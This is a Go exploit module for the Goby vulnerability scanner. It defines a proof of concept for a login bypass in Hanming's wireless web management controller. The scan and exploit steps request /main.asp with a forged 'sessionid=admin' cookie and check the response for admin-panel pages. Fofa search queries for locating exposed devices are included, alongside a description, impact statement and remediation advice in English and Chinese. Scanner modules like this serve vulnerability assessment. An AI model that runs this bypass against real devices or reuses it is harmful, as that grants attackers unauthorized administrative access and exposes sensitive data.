package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "There is a login bypass for the Hamming Wireless Management Controller",
    "Description": "<p>Suzhou Hanming Technology Co., Ltd. is an independent research and development enterprise specializing in the development and promotion of wireless local area network (WLAN) communication software and hardware. The company's wireless Web management system has login bypass.</p>",
    "Product": "Hamming Wireless Web Management System",
    "Homepage": "http://www.hanmingtech.com/",
    "DisclosureDate": "2022-05-05",
    "Author": "2935900435@qq.com",
    "FofaQuery": "banner=\"Server: INP httpd\" || header=\"Server: INP httpd\"",
    "GobyQuery": "banner=\"Server: INP httpd\" || header=\"Server: INP httpd\"",
    "Level": "2",
    "Impact": "<p>Attackers use this vulnerability to log in to the background of the system and obtain sensitive information.</p>",
    "Recommendation": "<p>1. It is recommended to put the user information in the cookie into the session or token. SessionID must apply a secure random number generation algorithm, SessionID cannot be inferred.</p><p>2. Pay attention to the official website: <a href=\"http://www.hanmingtech.com/\">http://www.hanmingtech.com/</a> to get the latest patches in time.</p>",
    "References": [
        "https://fofa.so/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/main.asp",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Ge  cko/20100101 Firefox/56.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Cookie": "sessionid=admin",
                    "Accept-Encoding": "gzip, deflate",
                    "X-Requested-With": "XMLHttpRequest"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "top_logo.asp",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "left_menu.asp",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "mainFrame",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/main.asp",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Ge  cko/20100101 Firefox/56.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Cookie": "sessionid=admin",
                    "Accept-Encoding": "gzip, deflate",
                    "X-Requested-With": "XMLHttpRequest"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "top_logo.asp",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "mainFrame",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "summary.asp",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|text|sessionid=admin"
            ]
        }
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "6",
    "Translation": {
        "CN": {
            "Name": "汉明无线管理控制器存在登录绕过",
            "Product": "汉明无线Web管理系统",
            "Description": "<p>苏州汉明科技有限公司是一家专业致力于无线局域网（WLAN）通信软件和硬件开发与推广的自主研发型企业，该公司无线Web管理系统存在登录绕过。<br></p>",
            "Recommendation": "<p>1、建议cookie中的user信息放入到session或者token中。SessionID必须应用安全的随机数量生成算法，SessionID无法推断。</p><p>2、关注官网：<a href=\"http://www.hanmingtech.com/\">http://www.hanmingtech.com/</a>及时获取到最新的补丁。<br></p>",
            "Impact": "<p>攻击者可利用该漏洞登录系统后台，获取敏感信息。<br></p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "There is a login bypass for the Hamming Wireless Management Controller",
            "Product": "Hamming Wireless Web Management System",
            "Description": "<p>Suzhou Hanming Technology Co., Ltd. is an independent research and development enterprise specializing in the development and promotion of wireless local area network (WLAN) communication software and hardware. The company's wireless Web management system has login bypass.<br></p>",
            "Recommendation": "<p>1. It is recommended to put the user information in the cookie into the session or token. SessionID must apply a secure random number generation algorithm, SessionID cannot be inferred.</p><p>2. Pay attention to the official website: <a href=\"http://www.hanmingtech.com/\">http://www.hanmingtech.com/</a> to get the latest patches in time.</p>",
            "Impact": "<p>Attackers use this vulnerability to log in to the background of the system and obtain sensitive information.<br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}